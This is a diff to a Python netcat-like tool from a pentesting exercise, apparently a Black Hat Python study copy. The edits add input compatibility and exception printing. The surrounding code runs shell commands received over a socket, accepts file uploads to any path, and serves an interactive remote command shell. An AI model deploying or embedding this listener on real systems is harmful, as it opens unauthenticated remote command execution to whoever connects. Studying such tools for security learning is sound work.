@@ -6,6 +6,11 @@ import getopt
 import threading
 import subprocess
 
+try:
+    insert = raw_input
+except:
+    insert = input
+
 listen = False
 command = False
 upload = False
@@ -39,7 +44,7 @@ def client_sender(buff):
 
     try:
         # conecta-se ao nosso host-alvo
-        client.connect((target, port))
+        client.connect( (target, port) )
         if len(buff):
             client.send(buff)
         while True:
@@ -57,13 +62,14 @@ def client_sender(buff):
             print(response)
 
             # espera mais dados de entrada
-            buff = input('')
+            buff = insert('<BHP:#>')
             buff += '\n'
 
             # envia os dados
             client.send(buff)
-    except:
+    except Exception as e:
         print('[*] Exception! Exiting.')
+        print(e)
 
         # encerra a conexão
         client.close()
@@ -95,7 +101,8 @@ def run_command(command):
     # executa o comando e obtém os dados de saída
     try:
         output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
-    except:
+    except Exception as e:
+        print(e)
         output = 'Failed to execute command.\r\n'
     # envia os dados de saída de volta ao cliente
     return output
@@ -109,7 +116,7 @@ def client_handler(client_socket):
     if len(upload_destination):
 
         # Lê todos os bytes e grava em nosso destino
-        file_buff = ''
+        file_buffer = ''
 
         # permanece lendo os dados até que não haja mais nenhum disponível
         while True:
@@ -118,17 +125,18 @@ def client_handler(client_socket):
             if not data:
                 break
             else:
-                file_buff += data
+                file_buffer += data
 
         # agora tentaremos gravar esses bytes
         try:
             file_descriptor = open(upload_destination, 'wb')
-            file_descriptor.write(file_buff)
+            file_descriptor.write(file_buffer)
             file_descriptor.close()
 
             # confirma que gravamos o arquivo
             client_socket.send('Successfully saved file to %s\r\n' %(upload_destination) )
-        except:
+        except Exception as e:
+            print(e)
             client_socket.send('Failed to save file to %s\r\n' %(upload_destination) )
     if len(execute):
         # executa o comando
@@ -138,19 +146,23 @@ def client_handler(client_socket):
 
     # entra em outro laço se um shell de comandos foi solicitado
     if command:
-        while True:
-            # mostra um prompt simples
-            client_socket.send('<BHP:#>')
+        try:
+            while True:
+                # mostra um prompt simples
+                client_socket.send('<BHP:#>')
 
-            cmd_buffer = ''
-            while '\n' not in cmd_buffer:
-                cmd_buffer += client_socket.recv(1024)
+                cmd_buffer = ''
+                while '\n' not in cmd_buffer:
+                    cmd_buffer += client_socket.recv(1024)
 
-            # envia de volta a saída do comando
-            response = run_command(cmd_buffer)
+                # envia de volta a saída do comando
+                response = run_command(cmd_buffer)
 
-            # envia de volta a resposta
-            client_socket.send(response)
+                # envia de volta a resposta
+                client_socket.send(response)
+        except Exception as e:
+            print(e)
+
 
 def main():
     global listen
